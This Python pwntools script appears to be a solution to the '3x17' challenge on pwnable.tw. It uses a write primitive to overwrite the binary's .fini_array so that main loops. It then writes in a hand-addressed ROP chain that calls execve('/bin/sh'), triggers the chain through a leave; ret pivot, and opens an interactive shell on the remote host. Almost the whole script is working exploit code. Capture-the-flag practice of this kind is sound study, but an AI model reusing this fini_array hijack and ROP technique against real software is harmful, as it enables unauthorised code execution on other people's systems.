#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or '3x17')
context.encoding = 'latin'
context.terminal = ['tmux', 'new-window']

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10105)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# -- Exploit goes here --

# a leave; ret gadget that's not called during normal execution
# for easier debugging
leave_ret = 0x489c24 
log.info("Leave ret: " + hex(leave_ret))

gdbscript = '''
break *{leave_ret}
continue
'''.format(**locals())
io = start()

# I used angrop to autogenerate a ropchain for execve('/bin/sh')
chain = b""
chain += p64(0x47e5d6)  # pop rax; pop rdx; pop rbx; ret
chain += p64(0x68732f6e69622f)
chain += p64(0x4b7000)
chain += p64(0x0)
chain += p64(0x4184d0)  # mov qword ptr [rdx], rax; ret
chain += p64(0x41e4af)  # pop rax; ret
chain += p64(0x3b)
chain += p64(0x401696)  # pop rdi; ret
chain += p64(0x4b7000)
chain += p64(0x44a309)  # pop rdx; pop rsi; ret
chain += p64(0x0)
chain += p64(0x0)
chain += p64(0x471db5)  # syscall

# Overwrite the _fini_array with main
fini_array = exe.get_section_by_name(".fini_array").header.sh_addr
dl_fini = 0x402960
main = 0x0401b6d

def write(addr, data):
    """Write data to addr using the write primitive"""
    assert len(data) <= 0x18
    io.sendlineafter(b'addr:',str(addr))
    io.sendafter(b'data:',data)

# 1. Loop main by writing to _fini_array
write(fini_array, p64(dl_fini) + p64(main))

# 2. Write the rop chain in 0x18 byte chunks
for i in range(0, len(chain), 0x18):
    write(fini_array + i + 0x10, chain[i:i+0x18])

# 3. Trigger the rop chain with leave; ret
ret = 0x402bcf
write(fini_array, p64(leave_ret) + p64(ret))

io.sendline(b'echo DAYUM we got a shell!')
log.success(io.recvuntil(b'DAYUM we got a shell!\n').decode())
io.sendline(b'id')
io.interactive()
